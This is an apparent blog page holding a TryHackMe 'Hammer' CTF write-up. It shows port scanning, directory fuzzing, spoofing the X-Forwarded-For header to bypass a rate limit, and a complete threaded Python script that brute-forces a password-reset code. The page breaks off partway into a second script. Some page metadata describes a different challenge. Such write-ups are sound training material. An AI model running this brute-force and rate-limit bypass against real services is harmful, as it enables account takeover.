@@ -1,0 +1,555 @@
+<!doctype html>
+<html lang=en dir=ltr>
+
+<head>
+    <title>HAMMER | THM Writeup :: W41T3XD3v1L</title>
+    <meta charset=utf-8>
+    <meta name=viewport content="width=device-width,initial-scale=1">
+    <meta name=description
+        content="Introduction Detailed walkthroughs for HAMMER CTF challenges on TryHackMe .
+    Summary Hammer started with discovering a log file on the web application with fuzzing and an email address inside. With a valid email address in hand, we were able to request a password reset for the user. After bypassing the rate limit to be able to brute-force the password recovery code, we were successful in resetting the password for the user and accessing the dashboard. After gaining access to the dashboard, we used forged JWTs to escalate our role from user to admin to be able to run commands and completed the room.">
+    <meta name=keywords
+        content="cyber security,penetration testing,ethical hacking,vulnerability assessment,network security,application security,web application security,security testing,red teaming,bug bounty,CTFs,cybersecurity challenges,hacking tutorials,security tools,exploit development,reverse engineering,penetration tester,security researcher,security analyst,information security,digital forensics,incident response,threat intelligence,security awareness,social engineering,phishing,malware analysis,cryptography,cloud security,IoT security,mobile security,how to become a penetration tester,penetration testing tools,CTF challenges for beginners,web application penetration testing,network penetration testing,exploit development tutorial,reverse engineering techniques,bug bounty hunting tips,security research projects,cyber security certifications">
+    <meta name=robots content="noodp">
+    <link rel=manifest href=/manifest.json>
+    <meta property="og:url" content="https://W41T3XD3v1L.github.io/posts/u.a.highschool/writeup/">
+    <meta property="og:site_name" content="W41T3XD3v1L">
+    <meta property="og:title" content="HAMMER | THM Writeup">
+    <meta property="og:description"
+        content="Introduction Detailed walkthroughs for HAMMER CTF challenges on TryHackMe .
+    Summary Hammer started with discovering a log file on the web application with fuzzing and an email address inside. With a valid email address in hand, we were able to request a password reset for the user. After bypassing the rate limit to be able to brute-force the password recovery code, we were successful in resetting the password for the user and accessing the dashboard. After gaining access to the dashboard, we used forged JWTs to escalate our role from user to admin to be able to run commands and completed the room.">
+    <meta property="og:locale" content="en">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-31T22:54:06+05:30">
+    <meta property="article:modified_time" content="2024-08-31T22:54:06+05:30">
+    <meta property="article:tag" content="Command Injection">
+    <meta property="article:tag" content="HexEditor">
+    <meta property="article:tag" content="StegHide">
+    <meta property="article:tag" content="SpecialCharacterBypass">
+    <meta property="og:see_also" content="https://W41T3XD3v1L.github.io/posts/airplane/writeup/">
+    <meta property="og:see_also" content="https://W41T3XD3v1L.github.io/posts/thenewyorkflankees/writeup/">
+    <meta property="og:see_also" content="https://W41T3XD3v1L.github.io/posts/cyberlens/writeup/">
+    <meta name=twitter:card content="summary">
+    <meta name=twitter:title content="HAMMER | THM Writeup">
+    <meta name=twitter:description
+        content="Introduction Detailed walkthroughs for HAMMER CTF challenges on TryHackMe .
+    Summary This CTF challenge required participants to identify and exploit a hidden OS command injection vulnerability in the U.A. Superhero Academy’s website. Successful exploitation led to gaining root privileges on the system.
+    Vulnerability The website contains a hidden functionality that allows for the execution of shell commands. This vulnerability can be exploited to gain unauthorized access to the system.">
+    <link rel=canonical href=https://W41T3XD3v1L.github.io/posts/u.a.highschool/writeup />
+    <link rel="shortcut icon" href=/favicon.ico>
+    <link rel=stylesheet href=/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script>
+    <script>var dnt, doNotTrack = !1; if (!1 && (dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack, doNotTrack = dnt == "1" || dnt == "yes"), !doNotTrack) { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments) } gtag("js", new Date), gtag("config", "G-376DY6PW0W") }</script>
+    <script
+        type=application/ld+json>{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"W41T3XD3v1L"},"dateModified":"2024-08-25T22:54:06+05:30","datePublished":"2024-08-31T22:54:06+05:30","description":"Introduction Detailed walkthroughs for HAMMER CTF challenges on TryHackMe .\nSummary This CTF challenge required participants to identify and exploit a hidden OS command injection vulnerability in the U.A. Superhero Academy\u0026rsquo;s website. Successful exploitation led to gaining root privileges on the system.\nVulnerability The website contains a hidden functionality that allows for the execution of shell commands. This vulnerability can be exploited to gain unauthorized access to the system.","image":"/posts/U.A.HighSchool/U.A.HighSchool.png","name":"HAMMER | THM Writeup","url":"https://W41T3XD3v1L.github.io/posts/u.a.highschool/writeup/"}</script>
+</head>
+
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800">
+    <header class="flex flex-none justify-center z-10">
+        <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+            <div class="flex-none ml-2 md:ml-0"><a href= /><img class="h-12 w-12 rounded-full object-cover bg-gray-100"
+                    src=/logo.png alt=logo></a></div>
+            <div class=flex-1></div>
+            <div class=flex-none>
+                <nav class="h-full static"><button id=navbar-menu-toggle type=button
+                        class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden"
+                        aria-controls=navbar-menu aria-expanded=false>
+                        <span class=sr-only>Open main menu</span>
+                        <i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24"
+                                stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                                stroke-linejoin="round">
+                                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                <path d="M4 6h16" />
+                                <path d="M4 12h16" />
+                                <path d="M4 18h16" />
+                            </svg></i></button>
+                    <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto"
+                        id=navbar-menu>
+                        <ul
+                            class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+                            <li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/
+                                    title=About>About</a></li>
+                            <li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/
+                                    title=Post>Post</a></li>
+                        </ul>
+                    </div>
+                </nav>
+            </div>
+            <div class="flex-none mx-1"></div>
+            <div class="flex-none md:hidden"><a href=/search/
+                    class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg"
+                    aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
+                    <i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24"
+                            stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                            stroke-linejoin="round">
+                            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                            <path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10" />
+                            <path d="M21 21l-6-6" />
+                        </svg></i></a></div>
+            <div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle
+                    class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600"
+                    title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox
+                        class="sr-only peer" aria-label="Toggle dark mode">
+                    <div
+                        class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
+                        <i
+                            class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg
+                                class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24"
+                                stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                                stroke-linejoin="round">
+                                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                <path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0" />
+                                <path d="M12 5v.01" />
+                                <path d="M17 7v.01" />
+                                <path d="M19 12v.01" />
+                                <path d="M17 17v.01" />
+                                <path d="M12 19v.01" />
+                                <path d="M7 17v.01" />
+                                <path d="M5 12v.01" />
+                                <path d="M7 7v.01" />
+                            </svg>
+                        </i><i
+                            class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg
+                                class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2"
+                                stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                <path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z" />
+                                <path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2" />
+                                <path d="M19 11h2m-1-1v2" />
+                            </svg></i></div>
+                </label></div>
+        </div>
+    </header>
+    <main class="flex flex-auto justify-center">
+        <div class="w-full max-w-4xl lg:max-w-5xl">
+            <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
+                <div><a href=/posts/hammer/writeup />
+                    <figure><img class="w-full object-cover h-36 md:h-48 xl:h-60"
+                            src=/posts/hammer/hammer-image.webp alt="HAMMER | THM Writeup"
+                            title="HAMMER | THM Writeup" loading=lazy></figure></a>
+                </div>
+                <div class="flex flex-col gap-y-3 p-6">
+                    <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a
+                            href=/posts/hammer/writeup />HAMMER | THM Writeup</a></h1>
+                    <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+                        <li><a href=/categories/ctf/
+                                class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">CTF</a>
+                        </li>
+                        <li><a href=/tags/command-injection/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>Command Injection</span></a></li>
+                        <li><a href=/tags/hexeditor/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>HexEditor</span></a></li>
+                        <li><a href=/tags/steghide/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>StegHide</span></a></li>
+                        <li><a href=/tags/specialcharacterbypass/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>SpecialCharacterBypass</span></a></li>
+                        <li><a href=/series/tryhackme/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>Tryhackme</span></a></li>
+                        <li><a href=/platforms/linux/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>Linux</span></a></li>
+                        <li><a href=/levels/easy/ class="flex flex-row text-sm mr-2 py-1"><i
+                                    class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash"
+                                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                        <path d="M5 9h14" />
+                                        <path d="M5 15h14" />
+                                        <path d="M11 4 7 20" />
+                                        <path d="M17 4l-4 16" />
+                                    </svg>
+                                </i><span class=ml-0>Easy</span></a></li>
+                    </ul>
+                    <div
+                        class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+                        <div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg
+                                    class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2"
+                                    stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z" />
+                                    <path d="M16 3v4" />
+                                    <path d="M8 3v4" />
+                                    <path d="M4 11h16" />
+                                    <path d="M11 15h1" />
+                                    <path d="M12 15v3" />
+                                </svg>
+                            </i><time datetime=2024-08-25T22:54:06+05:30>2024-08-31</time></div>
+                        <div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg
+                                    class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24"
+                                    stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                                    stroke-linejoin="round">
+                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                                    <path d="M6.5 7h11" />
+                                    <path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z" />
+                                    <path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z" />
+                                </svg>
+                            </i><span>7 minutes to read</span></div>
+                    </div>
+                    <article
+                        class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+                        <h2 id=introduction>Introduction</h2>
+                        <p>Detailed walkthroughs for <a href=https://tryhackme.com/r/room/yueiua target=_blank
+                                rel=noopener>HAMMER</a>
+                            CTF challenges on <a href=https://tryhackme.com target=_blank rel=noopener>TryHackMe</a>
+                            .</p>
+                        <h3 id=summary>Summary</h3>
+                        <p>Hammer started with discovering a log file on the web application with fuzzing and an email address inside. With a valid email address in hand, we were able to request a password reset for the user. After bypassing the rate limit to be able to brute-force the password recovery code, we were successful in resetting the password for the user and accessing the dashboard. After gaining access to the dashboard, we used forged JWTs to escalate our role from user to admin to be able to run commands and completed the room.</p>
+                        
+
+                        <h3 id=tools-used>Tools Used</h3>
+                        <p>rustscan, ffuf, curl, nc, wget, hexeditor, steghide, ssh</p>
+                        <h2 id=enumaration>Enumaration</h2>
+                        <div class=highlight>
+                            <pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>nmap</span> <span class=s2>-T4 -n -sC -sV -Pn -p-</span> 10.10.63.156
+    </span></span></code></pre>
+                        </div>
+                        <p>Lets start with mapping the target ip with <code>hammmer</code>.</p>
+                        <div class=highlight>
+                            <pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
+    </span></span><span class=line><span class=cl>Open 10.10.63.156:22
+    </span></span><span class=line><span class=cl>Open 10.10.63.156:1337
+    </span></span><span class=line><span class=cl><span class=o>[</span>&gt;<span class=o>]</span> Running script <span class=s2>&#34;nmap -vvv -p {{port}} {{ip}} -sC -sV&#34;</span> on ip 10.10.63.156
+    </span></span><span class=line><span class=cl>
+    </span></span><span class=line><span class=cl>PORT   STATE SERVICE REASON         VERSION
+    </span></span><span class=line><span class=cl>22/tcp open  ssh     syn-ack ttl <span class=m>60</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+    </span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+    </span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 96:97:2f:db:56:5e:4e:5b:d5:f3:75:47:46:96:ac:e5 <span class=o>(</span>RSA<span class=o>)</span>
+    </span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4WNbSymq7vKwxstoKDOXzTzNHnE4ut9BJPBlIb44tFvtMpfpXDF7Bq7MT9q4CWASVfZTw763S0OrtvpBFPpN/4eOvlircakFfkR3hZk7dHOXe8+cHXDth90XnMa2rq5CfxwinqP/Mo67XcpagbpU9O5lCatTMPWBUcEhIOXY8aUSMkmN6wRYSxdI40a4IYsjRqkqsdA6yaDQBSx+ryFRXwS9+kpUskAv452JKi1u2H5UGVX862GC1xAYHapKY24Yl6l5rTToGqTkobHVCv6t9dyaxkGtc/Skoi2mkWE/GM0SuqtbJ9A1qhSrfQRNpcIJ6UaVhDdUeO3qPX2uXPyLrY+i+1EgYEsRsxD5ym0bT1LPby8ONPduBEmZfnNoN5IBR05rQSSHhj349oNzDC4MRn2ygzOyx0n0c7wqffaAuohbu0cpeAcl5Nwb/Xw42RABDFQx08CttjNmtPMK/PqFt+H4nubyp7P8Pwctwi3wLf2GbU1lNgT0Ewf2GnfxY5Bs<span class=o>=</span>
+    </span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 83:3b:7a:7a:9c:61:8b:19:ef:77:11:1f:28:c0:bf:05 <span class=o>(</span>ECDSA<span class=o>)</span>
+    </span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+IqWgEnT5Asc+8VrYsQACkIjP+2CKuoor+erbKjpKwM8+X+1TPuwG56O6LxOLXeS2/pFjv9PBFI1oqHKa4GNw<span class=o>=</span>
+    </span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> db:30:10:99:b1:71:85:59:21:5a:67:21:6d:98:f3:b6 <span class=o>(</span>ED25519<span class=o>)</span>
+    </span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQa5m2TxGI3a9ZwhAd0zWsAYwCsYANdo6fgpS8XiJKL
+    </span></span><span class=line><span class=cl>1337/tcp open  http    syn-ack ttl <span class=m>60</span> Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
+    </span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
+    </span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: OPTIONS HEAD GET POST
+    </span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Login
+    </span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
+    </span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+    </span></span></code></pre>
+                        </div>
+                        <p>Lets start with rustscan, we found 2 open ports - <code>port 22(ssh)</code> and
+                            <code>port 1337(HTTP)</code> and the operating system used is <code>Linux</code>. Lets
+                            start with HTTP.</p>
+                        <figure><img src=/posts/hammer/01.webp title="uahschool.com Home Page"
+                                style="display:block;margin:0 auto">
+                            <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+                                <strong>hammer Login Page</strong></figcaption>
+                                
+                        </figure>
+                        <p>Clicking on the <code>Forgot your password?,</code> we get redirected to <code>http://10.10.63.156:1337/reset_password.php</code> where we see a form to input user email for a password reset.</p>
+                        <figure><img src=/posts/hammer/02.webp title="uahschool.com Home Page"
+                                style="display:block;margin:0 auto">
+                            <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+                                <strong>Forgot your password page</strong></figcaption>
+                                
+                        </figure>
+                        <p>Testing the form with a random email address, we get the message: <code>Invalid email address!</code></p>
+                        <figure><img src=/posts/hammer/03.webp title="uahschool.com Home Page"
+                                style="display:block;margin:0 auto">
+                            <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+                                <strong>Invalid email address page</strong></figcaption>
+                                
+                        </figure>
+
+
+
+                        <h3 id=os-command-injection>First Flag</h3>
+                        <h4 id=os-command-injection>Discovering the Email
+                        </h4>
+                        <p>Checking the source code for <code>http://10.10.63.156:1337/</code>, we see a note left by the developer about the naming convention.</p>
+                        <figure><img src=/posts/hammer/04.webp title="uahschool.com Home Page"
+                                style="display:block;margin:0 auto">
+                            <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+                                <strong>ctl + u</strong></figcaption>  
+                        </figure>
+                        <p>Using <code>ffuf</code> to fuzz for any directories following this naming convention, we discover <code>/hmr_logs</code>.</p>
+                        <div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$  ffuf -u 'http://10.10.63.156:1337/hmr_FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100 -mc all -ic -fw 23
+    </span></span><span class=line><span class=cl>...
+    </span></span><span class=line><span class=cl>css        <span class=o>[</span>Status: 200, Size: 2573, Words: 232, Lines: 64, Duration: 169ms<span class=o>]</span>
+    </span></span><span class=line><span class=cl>js         <span class=o>[</span>Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 146ms<span class=o>]</span> <span class=c1># directory</span>
+    </span></span><span class=line><span class=cl>images     <span class=o>[</span>Status: 200, Size: 2056, Words: 142, Lines: 72, Duration: 157ms<span class=o>]</span>
+    </span></span><span class=line><span class=cl>logs       <span class=o>[</span>Status: 200, Size: 2580, Words: 180, Lines: 88, Duration: 148ms<span class=o>]</span>
+    </pre></div><p>Looking at the <code>http://10.10.63.156:1337/hmr_logs/,</code> file indexing is enabled and there is a single file named <code>errors.log</code>.</p><figure><img src=/posts/hammer/05.webp title="uahschool.com Home Page"
+    style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>some logs</strong></figcaption></figure><p>Reading the errors.log file, we discover an email address: <code>tester@hammer.thm</code></p><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line>
+$ curl -s 'http://10.10.63.156:1337/hmr_logs/error.logs'
+[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
+[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
+[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
+[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
+[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
+[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
+[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
+[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
+[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down</pre><h2>Bypassing the Rate Limit</h2><p>Now that we discovered a valid email address, we can try to reset the password for the user at <code>http://10.10.63.156:1337/reset_password.php.</code></p><p>After submitting the email, we see a new form, this time asking for a 4-digit recovery code.</p><figure><img src=/posts/hammer/06.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>OTP Auth Page</strong></figcaption></figure><p>Since it is only a 4-digit code, we should be able to brute-force it easily. However, if we attempt to do so, we will first notice the <code>Rate-Limit-Pending</code> header in the response.</p><figure><img src=/posts/hammer/07.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"> <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"></figcaption></figure><p>If we continue to make requests in quick succession, we will see it decreasing.</p><figure><img src=/posts/hammer/08.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><p>And when it reaches zero, we see that now we are getting rate-limited.</p><figure><img src=/posts/hammer/09.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><p>So, if we want to brute-force the recovery code, we need to figure out a way to bypass the rate limit.</p><p>Trying out different common methods for it, we have success using the <code>X-Forwarded-For</code> header.</p><p>First, we can see that we are rate-limited.</p><figure><img src=/posts/hammer/10.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><p>But if we add the <code>X-Forwarded-For: 127.0.0.1</code> header, we can see the rate limit counter being reset.</p><figure><img src=/posts/hammer/11.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><p>Of course, once this counter also reaches zero, we will be once again rate-limited.</p><figure><img src=/posts/hammer/12.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><p>But simply changing the IP address in the header, we are able to reset the counter once more.</p><figure><img src=/posts/hammer/13.webp title="uahschool.com Home Page" style="display:block;margin:0 auto"></figure><h2>Brute-forcing the Code</h2><p>Now that we found a way to bypass the rate limit, I wrote a Python script for <code>brute-forcing the recovery code</code></p><p>File: <code>brute-forcing.py</code></p><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line>#!/usr/bin/env python3
+
+import requests
+import random
+import threading
+
+url = "http://10.10.63.156:1337/reset_password.php"
+stop_flag = threading.Event()
+num_threads = 50
+
+
+def brute_force_code(session, start, end):
+    for code in range(start, end):
+        code_str = f"{code:04d}"
+        try:
+            r = session.post(
+                url,
+                data={"recovery_code": code_str, "s": "180"},
+                headers={
+                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
+                },
+                allow_redirects=False,
+            )
+            if stop_flag.is_set():
+                return
+            elif r.status_code == 302:
+                stop_flag.set()
+                print("[-] Timeout reached. Try again.")
+                return
+            else:
+                if "Invalid or expired recovery code!" not in r.text:
+                    stop_flag.set()
+                    print(f"[+] Found the recovery code: {code_str}")
+                    print("[+] Printing the response: ")
+                    print(r.text)
+                    return
+        except Exception as e:
+            #print(e)
+            pass
+
+
+def main():
+    session = requests.Session()
+    print("[+] Sending the password reset request.")
+    session.post(url, data={"email": "tester@hammer.thm"})
+    print("[+] Starting the code brute-force.")
+    code_range = 10000
+    step = code_range // num_threads
+    threads = []
+    for i in range(num_threads):
+        start = i * step
+        end = start + step
+        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
+
+
+if __name__ == "__main__":
+    main()</pre><p>First, it makes a password reset request for <code>tester@hammer.thm</code>. After that, it starts multiple threads to try different recovery codes with randomly generated IP addresses for the <code>X-Forwarded-For</code> header, and if it finds the right code, it prints the response to it, so we can see the next step.</p><p>Running the script, we see the next step after entering a valid code: a form for setting a new password.</p><pre>$ python3 brute_force_code.py
+[+] Sending the password reset request.
+[+] Starting the code brute-force.
+[+] Found the recovery code: 6545
+[+] Printing the response:
+....
+</pre><h2>Resetting the Password</h2>
+<h1>Now that we know the next step after brute-forcing the code, we can modify our script a bit to also submit a new password upon discovering the valid code.</h1><h3>File : <code>reset_pass.py</code></h3><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line>#!/usr/bin/env python3
+
+import requests
+import random
+import threading
+
+url = "http://10.10.63.156:1337/reset_password.php"
+stop_flag = threading.Event()
+num_threads = 50
+
+
+def brute_force_code(session, start, end):
+    for code in range(start, end):
